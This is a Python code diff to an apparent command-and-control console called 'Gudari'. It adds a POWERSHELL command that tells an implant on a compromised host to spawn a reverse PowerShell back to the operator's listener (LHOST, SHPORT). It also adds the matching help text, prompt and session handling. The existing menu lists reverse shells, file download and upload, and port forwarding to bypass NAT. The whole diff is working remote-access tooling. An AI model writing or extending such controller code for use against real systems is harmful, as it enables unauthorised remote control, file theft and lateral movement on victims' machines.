@@ -89,7 +89,7 @@ def addShellSession(S, session):
     if PARAMS['RANDOM']=='1': PARAMS['SHPORT']=randomPort()
     SID+=1
     sSID=str(SID)
-    SESSIONS[sSID]=GudariShell(PARAMS['LHOST'],int(PARAMS['SHPORT']))
+    SESSIONS[sSID]=GudariShell(PARAMS['LHOST'],int(PARAMS['SHPORT']),"revshell")
     #Need to send the command through the s socket
     cmd="SPAWN %s %s\n"%(PARAMS['LHOST'],PARAMS['SHPORT'])
     session.sktSend(cmd)
@@ -101,6 +101,28 @@ def addShellSession(S, session):
         SESSIONS[sSID]=False       
     return SID
 
+def addPowerShellSession(S, session):
+    # check that lhost is set
+    global SID
+    global PARAMS
+
+    Msg.info("Spawnning a powershell...")
+    Msg.info("Check available commands with !HELP")
+    #Random port if random==1
+    if PARAMS['RANDOM']=='1': PARAMS['SHPORT']=randomPort()
+    SID+=1
+    sSID=str(SID)
+    SESSIONS[sSID]=GudariShell(PARAMS['LHOST'],int(PARAMS['SHPORT']),"revPowershell")
+    #Need to send the command through the s socket
+    cmd="POWERSHELL %s %s\n"%(PARAMS['LHOST'],PARAMS['SHPORT'])
+    session.sktSend(cmd)
+    Msg.info(cmd)
+    if SESSIONS[sSID].connect()!=False:
+        PARAMS['SESSION']=sSID       
+    else :
+        Msg.err("Connection Failed!")
+        SESSIONS[sSID]=False       
+    return SID
 
 def setVar(var,value):    
     global PARAMS
@@ -188,6 +210,8 @@ def getPrompt():
         prompt="#{0:s}(src:{1:s} to tcp:{2:d})> ".format(PARAMS['SESSION'],SESSIONS[PARAMS['SESSION']].RHOST[0],SESSIONS[PARAMS['SESSION']].LPORT)
     elif SESSIONS[PARAMS['SESSION']].TYPE == "revshell":
         prompt=" "
+    elif SESSIONS[PARAMS['SESSION']].TYPE == "revPowershell":
+        prompt=" "
     return prompt
 
 def mainHelper():
@@ -207,6 +231,7 @@ def gudariHelper():
     data.append(['SET','VAR VALUE','Check available VARS with SHOW OPTIONS'])
     data.append(['RUN','(none)','Spawns a Gudari listener with the active conf.'])
     data.append(['SHELL','(none)','Spawns a reverse shell'])
+    data.append(['POWERSHELL','(none)','Spawns a reverse Powershell'])
     data.append(['DOWNLOAD','RemoteFile','Use full path. File stored in LDIR'])
     data.append(['UPLOAD','LocalFilename','Use full path. File stored in RDIR'])
     data.append(['FORWARD','LPORT RHOST RPORT','Creates a port forward to bypass NAT'])
@@ -274,6 +299,10 @@ def consoleGudari():
         
         elif action=="SHELL":
             SID=addShellSession(PARAMS['SESSION'],SESSIONS[PARAMS['SESSION']])
+            time.sleep(LAG)
+
+        elif action=="POWERSHELL":
+            SID=addPowerShellSession(PARAMS['SESSION'],SESSIONS[PARAMS['SESSION']])
             time.sleep(LAG)
 
         elif action=="TERMINATE":
@@ -359,6 +388,7 @@ while True:
         #Need to control SESSION is an instance
         if 'classes' in str(type(SESSIONS[PARAMS['SESSION']])):
             if SESSIONS[PARAMS['SESSION']].TYPE == "revshell": consoleShell()
+            elif SESSIONS[PARAMS['SESSION']].TYPE == "revPowershell": consoleShell()
             elif SESSIONS[PARAMS['SESSION']].TYPE == "gudari": consoleGudari()
         else:
             if PARAMS['SESSION']!='0': Msg.warn("Invalid session. Switching to main...")
